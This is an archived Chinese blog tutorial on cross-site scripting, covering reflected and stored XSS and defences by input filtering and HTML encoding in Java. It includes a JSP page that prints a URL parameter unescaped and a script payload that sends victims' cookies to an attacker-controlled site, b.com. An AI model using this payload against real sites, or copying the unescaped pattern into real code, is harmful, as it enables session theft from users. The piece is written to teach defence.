<html>
<head>
  <title>XSS攻击及防御</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="Evernote Windows/272632; Windows/6.1.7601 Service Pack 1;"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="882"/>
<h1>XSS攻击及防御</h1>

<div>
<div><p> 本文来自：<a href="http://blog.csdn.net/ghsau" shape="rect" target="_blank">高爽|Coder</a>，原文地址：<a href="http://blog.csdn.net/ghsau/article/details/17027893" shape="rect" target="_blank">http://blog.csdn.net/ghsau/article/details/17027893</a>，转载请注明。<br clear="none"/>        XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有 XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。</p><h1><a name="t0" shape="rect"></a>XSS攻击</h1><p>       XSS攻击类似于SQL注入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，<strong>所有可输入的地方</strong>没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。</p><h2><a name="t1" shape="rect"></a>DOM Based XSS</h2><p>       DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</p><p>       <strong>场景一</strong>：</p><p>       当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似： </p><table border="1" cellpadding="0" cellspacing="0" style="background: #F2F2F2;"><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #bf5f3f;">&lt;%@</span> <span style="color: #3f7f7f;">page</span> <span style="color: #7f007f;">language</span>=<em><span style="color: #2a00ff;">&quot;java&quot;</span></em><span style="color: #7f007f;">contentType</span>=<em><span style="color: #2a00ff;">&quot;text/html; charset=UTF-8&quot;</span></em><span style="color: #7f007f;">pageEncoding</span>=<em><span style="color: #2a00ff;">&quot;UTF-8&quot;</span></em><span style="color: #bf5f3f;">%&gt;</span></p><p align="left"><span style="color: teal;">&lt;!</span><span style="color: #3f7f7f;">DOCTYPE</span><span style="color: teal;">html</span><span style="color: gray;">PUBLIC</span> <span style="color: teal;">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span><span style="color: #3f7f5f;">&quot;<a href="http://www.w3.org/TR/html4/loose.dtd" shape="rect">http://www.w3.org/TR/html4/loose.dtd</a>&quot;</span><span style="color: teal;">&gt;</span></p><p align="left"><span style="color: teal;">&lt;</span><span style="color: #3f7f7f;">html</span><span style="color: teal;">&gt;</span></p><p align="left">    <span style="color: teal;">&lt;</span><span style="color: #3f7f7f;">head</span><span style="color: teal;">&gt;</span></p><p align="left">       <span style="color: teal;">&lt;</span><span style="color: #3f7f7f;">title</span><span style="color: teal;">&gt;</span>XSS测试<span style="color: teal;">&lt;/</span><span style="color: #3f7f7f;">title</span><span style="color: teal;">&gt;</span></p><p align="left">    <span style="color: teal;">&lt;/</span><span style="color: #3f7f7f;">head</span><span style="color: teal;">&gt;</span></p><p align="left">    <span style="color: teal;">&lt;</span><span style="color: #3f7f7f;">body</span><span style="color: teal;">&gt;</span></p><p align="left">       页面内容：<span style="color: #bf5f3f;">&lt;%=</span>request.getParameter(<span style="color: #2a00ff;">&quot;content&quot;</span>)<span style="color: #bf5f3f;">%&gt;</span></p><p align="left">    <span style="color: teal;">&lt;/</span><span style="color: #3f7f7f;">body</span><span style="color: teal;">&gt;</span></p><p><span style="color: teal;">&lt;/</span><span style="color: #3f7f7f;">html</span><span style="color: teal;">&gt;</span></p></td></tr></table><div>      我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com/?content=" shape="rect">http://www.a.com?content=</a>&lt;script&gt;window.open(“<a href="http://www.b.com/?param=%E2%80%9D+document.cookie" shape="rect">www.b.com?param=”+document.cookie</a>)&lt;/script&gt;， 当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到 b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密 码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=&lt;script&gt; alert(“xss”)&lt;/script&gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我 如何攻击别人并且获利呢？</div><h2><a name="t2" shape="rect"></a>Stored XSS</h2><p>       Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。</p><p>       <strong>场景二</strong>：</p><p>       a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，&lt;script&gt;window.open(“<a href="http://www.b.com/?param=%E2%80%9D+document.cookie" shape="rect">www.b.com?param=”+document.cookie</a>)&lt;/script&gt;，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。<br clear="none"/>        Stored XSS漏洞危害性更大，危害面更广。</p><h1><a name="t3" shape="rect"></a>XSS防御</h1><p>       我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。XSS防御有如下方式。</p><h2><a name="t4" shape="rect"></a>完善的过滤体系</h2><p>       永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</p><h2><a name="t5" shape="rect"></a>Html encode</h2><p>       假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p><table border="1" cellpadding="0" cellspacing="0" style="background: #F2F9FF;" width="675"><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">less-than character (&lt;)</span></p></td><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">&amp;lt;</span></p></td></tr><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">greater-than character (&gt;)</span></p></td><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">&amp;gt;</span></p></td></tr><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">ampersand character (&amp;)</span></p></td><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">&amp;amp;</span></p></td></tr><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">double-quote character (&quot;)</span></p></td><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">&amp;quot;</span></p></td></tr><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">space character( )</span></p></td><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">&amp;nbsp;</span></p></td></tr><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">Any ASCII code character whose code is greater-than or equal to 0x80</span></p></td><td colspan="1" rowspan="1" valign="top"><p align="left"><span style="color: #2e2e2e;">&amp;#&lt;number&gt;, where &lt;number&gt; is the ASCII character value.</span></p></td></tr></table><div>      比如用户输入：&lt;script&gt;window.location.href=”<a href="http://www.baidu.com%e2%80%9d;/" shape="rect">http://www.baidu.com”;</a>&lt;/script&gt;，保存后最终存储的会是：&amp;lt;script&amp;gt;window.location.href=&amp;quot;<a href="http://www.baidu.com%26amp;quot;%26amp;lt;/script%26amp;gt;%E5%9C%A8%E5%B1%95%E7%8E%B0%E6%97%B6%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E5%AF%B9%E8%BF%99%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%BD%AC%E6%8D%A2%E6%88%90%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E6%AE%B5%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82" shape="rect">http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></div><h1><a name="t6" shape="rect"></a>其它</h1><div>       下面提供两种Html encode的方法。</div><div><ul><li>使用Apache的commons-lang.jar<table border="1" cellpadding="0" cellspacing="0"><tr><td colspan="1" rowspan="1" valign="top"><p align="left">StringEscapeUtils.escapeHtml(str);// 汉字会转换成对应的ASCII码，空格不转换</p></td></tr></table></li></ul><ul><li>自己实现转换，只转换部分字符<table border="1" cellpadding="0" cellspacing="0" style="background: #F2F2F2;"><tr><td colspan="1" rowspan="1" valign="top"><p align="left"><strong><span style="color: #7f0055;">private</span> <span style="color: #7f0055;">static</span></strong> String htmlEncode(<strong><span style="color: #7f0055;">char</span></strong> c) {</p><p align="left">    <strong><span style="color: #7f0055;">switch</span></strong>(c) {</p><p align="left">       <strong><span style="color: #7f0055;">case</span></strong> <span style="color: #2a00ff;">'&amp;'</span>:</p><p align="left">           <strong><span style="color: #7f0055;">return</span></strong><span style="color: #2a00ff;">&quot;&amp;amp;&quot;</span>;</p><p align="left">       <strong><span style="color: #7f0055;">case</span></strong> <span style="color: #2a00ff;">'&lt;'</span>:</p><p align="left">           <strong><span style="color: #7f0055;">return</span></strong><span style="color: #2a00ff;">&quot;&amp;lt;&quot;</span>;</p><p align="left">       <strong><span style="color: #7f0055;">case</span></strong> <span style="color: #2a00ff;">'&gt;'</span>:</p><p align="left">           <strong><span style="color: #7f0055;">return</span></strong><span style="color: #2a00ff;">&quot;&amp;gt;&quot;</span>;</p><p align="left">       <strong><span style="color: #7f0055;">case</span></strong> <span style="color: #2a00ff;">'&quot;'</span>:</p><p align="left">           <strong><span style="color: #7f0055;">return</span></strong><span style="color: #2a00ff;">&quot;&amp;quot;&quot;</span>;</p><p align="left">       <strong><span style="color: #7f0055;">case</span></strong> <span style="color: #2a00ff;">' '</span>:</p><p align="left">           <strong><span style="color: #7f0055;">return</span></strong><span style="color: #2a00ff;">&quot;&amp;nbsp;&quot;</span>;</p><p align="left">       <strong><span style="color: #7f0055;">default</span></strong>:</p><p align="left">           <strong><span style="color: #7f0055;">return</span></strong> c +<span style="color: #2a00ff;">&quot;&quot;</span>;</p><p align="left">    }</p><p align="left">}</p><p align="left"> </p><p align="left"><span style="color: #3f5fbf;">/**</span> <span style="color: #3f5fbf;">对传入的字符串</span><span style="text-decoration: underline;"><span style="color: #3f5fbf;">str</span></span><span style="color: #3f5fbf;">进行</span><span style="text-decoration: underline;"><span style="color: #3f5fbf;">Html</span></span> <span style="color: #3f5fbf;">encode</span><span style="color: #3f5fbf;">转换</span> <span style="color: #3f5fbf;">*/</span></p><p align="left"><strong><span style="color: #7f0055;">public</span> <span style="color: #7f0055;">static</span></strong> String htmlEncode(String str) {</p><p align="left">    <strong><span style="color: #7f0055;">if</span></strong>(str ==<strong><span style="color: #7f0055;">null</span></strong> || str.trim().equals(<span style="color: #2a00ff;">&quot;&quot;</span>))   <strong><span style="color: #7f0055;">return</span></strong> str;</p><p align="left">    StringBuilder encodeStrBuilder = <strong><span style="color: #7f0055;">new</span></strong> StringBuilder();</p><p align="left">    <strong><span style="color: #7f0055;">for</span></strong> (<strong><span style="color: #7f0055;">int</span></strong> i = 0, len = str.length(); i &lt; len; i++) {</p><p align="left">       encodeStrBuilder.append(<em>htmlEncode</em>(str.charAt(i)));</p><p align="left">    }</p><p align="left">    <strong><span style="color: #7f0055;">return</span></strong> encodeStrBuilder.toString();</p><p>}</p></td></tr></table></li></ul></div></div>
</div></body></html> 